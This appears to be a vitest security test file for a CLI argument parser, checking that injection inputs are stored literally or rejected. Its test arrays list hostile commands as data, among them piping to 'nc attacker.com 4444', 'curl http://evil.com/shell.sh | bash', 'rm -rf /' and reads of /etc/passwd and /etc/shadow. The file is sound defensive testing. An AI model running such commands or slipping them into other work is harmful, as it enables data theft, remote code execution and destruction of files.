import { describe, it, expect, vi, beforeEach } from 'vitest';
import { parseArgs, validateOption } from '../../cli/lib/parse-args.js';
import { TECHNOLOGIES, LANGUAGES } from '../../cli/lib/constants.js';

/**
 * SEC-13: Security injection tests for CLI inputs.
 *
 * These tests verify that the CLI properly handles malicious inputs
 * including shell injection, command substitution, and various
 * metacharacter attacks.
 */

describe('SEC-13: CLI injection security', () => {
  describe('shell metacharacters in --tech values', () => {
    const maliciousTechs = [
      'symfony; rm -rf /',
      'react && cat /etc/passwd',
      'flutter | nc attacker.com 4444',
      'angular$(whoami)',
      'laravel`id`',
      "python'; drop table users; --",
      'vuejs\nmalicious-command',
      'csharp > /dev/null; curl evil.com',
      'react$(curl http://evil.com/shell.sh | bash)',
    ];

    for (const tech of maliciousTechs) {
      it(`rejects malicious --tech="${tech}"`, () => {
        // parseArgs itself does not reject — but the CLI validates against TECHNOLOGIES
        const result = parseArgs(['install', `--tech=${tech}`]);
        // The value is stored as-is in parseArgs (it's a pure parser)
        expect(result.options.tech).toBe(tech);
        // But it must NOT match any valid technology
        expect(TECHNOLOGIES[result.options.tech]).toBeUndefined();
      });
    }
  });

  describe('command substitution in paths', () => {
    const maliciousPaths = [
      '$(whoami)',
      '`id`',
      '/tmp/$(rm -rf /)',
      '/home/`cat /etc/shadow`/project',
      '${IFS}cat${IFS}/etc/passwd',
      '/tmp/$((1+1))',
    ];

    for (const malPath of maliciousPaths) {
      it(`stores path literally without expansion: "${malPath}"`, () => {
        const result = parseArgs(['install', malPath, '--tech=react']);
        // parseArgs stores the path as a literal string — no shell expansion
        expect(result.path).toBe(malPath);
      });
    }
  });

  describe('null byte injection', () => {
    it('rejects null bytes in --tech value', () => {
      expect(() => parseArgs(['install', '--tech=react\0extra'])).toThrow('null bytes not allowed');
    });

    it('rejects null bytes in --lang value', () => {
      expect(() => parseArgs(['install', '--lang=en\0'])).toThrow('null bytes not allowed');
    });

    it('rejects null bytes in --output value', () => {
      expect(() => parseArgs(['flatten', '--output=file\0.txt'])).toThrow('null bytes not allowed');
    });
  });

  describe('path traversal attacks', () => {
    it('rejects --output with leading ../', () => {
      expect(() => parseArgs(['flatten', '--output=../../../etc/passwd'])).toThrow('path traversal');
    });

    it('rejects --output with embedded /../', () => {
      expect(() => parseArgs(['flatten', '--output=/safe/dir/../../../etc/shadow'])).toThrow('path traversal');
    });

    it('rejects --output with backslash traversal', () => {
      expect(() => parseArgs(['flatten', '--output=..\\..\\windows\\system32'])).toThrow('path traversal');
    });
  });

  describe('oversized input handling', () => {
    it('handles very long tech name without crashing', () => {
      const longTech = 'a'.repeat(10000);
      const result = parseArgs(['install', `--tech=${longTech}`]);
      expect(result.options.tech).toBe(longTech);
      expect(TECHNOLOGIES[result.options.tech]).toBeUndefined();
    });

    it('handles very long path without crashing', () => {
      const longPath = '/' + 'a'.repeat(10000);
      const result = parseArgs(['install', longPath]);
      expect(result.path).toBe(longPath);
    });

    it('handles many options without crashing', () => {
      const manyArgs = Array.from({ length: 1000 }, (_, i) => `--opt${i}=val${i}`);
      const result = parseArgs(manyArgs);
      expect(Object.keys(result.options).length).toBe(1000);
    });
  });

  describe('special characters in option values', () => {
    const specialChars = [
      { desc: 'semicolons', value: 'val;rm -rf /' },
      { desc: 'pipes', value: 'val|cat /etc/passwd' },
      { desc: 'ampersands', value: 'val&&malicious' },
      { desc: 'backticks', value: 'val`id`' },
      { desc: 'dollar parens', value: 'val$(whoami)' },
      { desc: 'angle brackets', value: 'val>/tmp/pwned' },
      { desc: 'newlines', value: 'val\nmalicious' },
      { desc: 'carriage returns', value: 'val\rmalicious' },
      { desc: 'single quotes', value: "val'injection" },
      { desc: 'double quotes', value: 'val"injection' },
      { desc: 'backslashes', value: 'val\\injection' },
    ];

    for (const { desc, value } of specialChars) {
      it(`stores ${desc} literally in --lang option`, () => {
        const result = parseArgs(['install', `--lang=${value}`]);
        // parseArgs stores verbatim — validation happens downstream
        expect(result.options.lang).toBe(value);
        // Must not match any valid language
        expect(LANGUAGES[result.options.lang]).toBeUndefined();
      });
    }
  });

  describe('validateOption boundary cases', () => {
    it('rejects --max-iterations with shell command', () => {
      expect(() => validateOption('max-iterations', '$(rm -rf /)')).toThrow('must be a positive integer');
    });

    it('rejects --max-iterations with very large number', () => {
      expect(() => validateOption('max-iterations', '99999999999999999')).not.toThrow();
    });

    it('rejects --max-iterations with Infinity', () => {
      expect(() => validateOption('max-iterations', 'Infinity')).toThrow('must be a positive integer');
    });

    it('rejects --max-iterations with NaN string', () => {
      expect(() => validateOption('max-iterations', 'NaN')).toThrow('must be a positive integer');
    });

    it('accepts --max-iterations with hex notation (Number coercion)', () => {
      // 0xff = 255, Number.isInteger(255) is true — this is accepted
      expect(() => validateOption('max-iterations', '0xff')).not.toThrow();
    });

    it('accepts --max-iterations with scientific notation (Number coercion)', () => {
      // 1e5 = 100000, Number.isInteger(100000) is true — this is accepted
      expect(() => validateOption('max-iterations', '1e5')).not.toThrow();
    });
  });

  describe('technology allowlist validation', () => {
    it('only accepts known technology keys', () => {
      const validTechs = Object.keys(TECHNOLOGIES);
      expect(validTechs).toContain('symfony');
      expect(validTechs).toContain('react');
      expect(validTechs).not.toContain('malicious');
      expect(validTechs).not.toContain('');
      expect(validTechs).not.toContain('__proto__');
    });

    it('rejects prototype pollution via tech key', () => {
      const result = parseArgs(['install', '--tech=__proto__']);
      // Object bracket access on __proto__ returns {}, but it's not an own property
      expect(Object.hasOwn(TECHNOLOGIES, result.options.tech)).toBe(false);
    });

    it('rejects constructor pollution via tech key', () => {
      const result = parseArgs(['install', '--tech=constructor']);
      // Object bracket access on constructor returns Function, but it's not an own property
      expect(Object.hasOwn(TECHNOLOGIES, result.options.tech)).toBe(false);
    });
  });

  describe('language allowlist validation', () => {
    it('only accepts known language keys', () => {
      const validLangs = Object.keys(LANGUAGES);
      expect(validLangs).toEqual(['en', 'fr', 'es', 'de', 'pt']);
    });

    it('rejects empty string as language', () => {
      expect(LANGUAGES['']).toBeUndefined();
    });
  });
});
